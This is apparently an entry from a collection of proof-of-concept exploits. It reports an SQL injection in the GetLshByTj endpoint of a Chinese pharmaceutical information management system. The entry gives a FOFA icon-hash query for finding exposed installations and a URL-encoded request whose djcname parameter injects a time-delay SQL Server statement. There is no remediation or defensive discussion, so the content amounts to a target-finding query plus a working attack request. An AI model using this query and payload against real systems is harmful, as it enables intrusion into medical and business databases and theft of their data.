## 医药信息管理系统GetLshByTj存在SQL注入

## fofa

```
icon_hash="775044030"
```

## poc

```
/WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%33%27%2d%2d%20%2d&redonly=true&tjstr=12
```

![医药信息管理系统 GetLshByTj SQL注入](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262320713.png)